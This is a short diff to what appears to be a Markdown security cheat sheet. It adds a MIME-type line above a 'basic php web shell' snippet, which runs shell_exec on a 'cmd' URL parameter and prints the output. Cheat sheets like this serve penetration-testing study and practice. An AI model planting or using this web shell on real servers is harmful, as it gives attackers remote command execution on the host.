@@ -24,6 +24,9 @@
 ## Cheat Sheet
 
 ```php
+
+application/x-php
+
 // basic php web shell
 <?php
     echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
